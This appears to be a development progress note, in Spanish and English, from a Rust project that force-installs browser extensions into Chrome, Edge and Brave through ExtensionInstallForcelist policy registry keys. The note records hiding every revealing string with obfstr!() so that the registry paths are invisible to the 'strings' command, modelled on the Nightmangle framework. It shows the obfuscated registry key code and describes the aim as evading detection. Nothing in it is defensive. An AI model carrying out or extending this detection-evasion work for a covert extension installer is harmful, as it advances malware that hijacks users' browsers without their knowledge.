# String Obfuscation Refactorization Plan

Ver `OBFUSCATION_STRATEGY.md` para plan completo.

## Aplicando técnicas de Nightmangle

**Key insight**: Nightmangle usa `obfstr!()` en TODAS partes:
- SQL queries
- Registry keys  
- File paths
- Error messages

## ✅ COMPLETADO - extension_installer.rs

**Status**: 100% obfuscated - ALL 40+ strings wrapped with `obfstr!()`

Funciones refactorizadas:
- ✅ `install_chrome()` - 8 strings (Google, Chrome, User Data, Default, LOCALAPPDATA)
- ✅ `install_edge()` - 7 strings (Microsoft, Edge, User Data, Default)
- ✅ `install_brave()` - 7 strings (BraveSoftware, Brave-Browser, Brave)
- ✅ `install_via_registry()` - 4 strings **CRÍTICOS** (Software\\Policies, ExtensionInstallForcelist, file:///, "1")
- ✅ `create_external_extension_file()` - 4 strings (Invalid path, External Extensions, external_crx, external_version)
- ✅ `install_all()` - 3 strings (Chrome, Edge, Brave returns)
- ✅ `is_installed()` - 3 registry paths **CRÍTICOS**
- ✅ `uninstall()` - 4 strings (registry paths + Unknown browser)

**Registry keys CRÍTICOS obfuscados**:
```rust
// ANTES (DETECTABLE):
"Software\\Policies\\Google\\Chrome\\ExtensionInstallForcelist"
"Software\\Policies\\Microsoft\\Edge\\ExtensionInstallForcelist"

// DESPUÉS (OCULTO):
obfstr!("Software\\Policies\\Google\\Chrome\\ExtensionInstallForcelist").to_string()
obfstr!("Software\\Policies\\Microsoft\\Edge\\ExtensionInstallForcelist").to_string()
```

**Compilación**: ✅ SUCCESS - 60 warnings (unused code), 0 errors

**Impacto**: 
- Registry keys NO visibles con `strings` command
- ExtensionInstallForcelist path completamente ofuscado
- Browser names obfuscados
- Paths (User Data, External Extensions) obfuscados
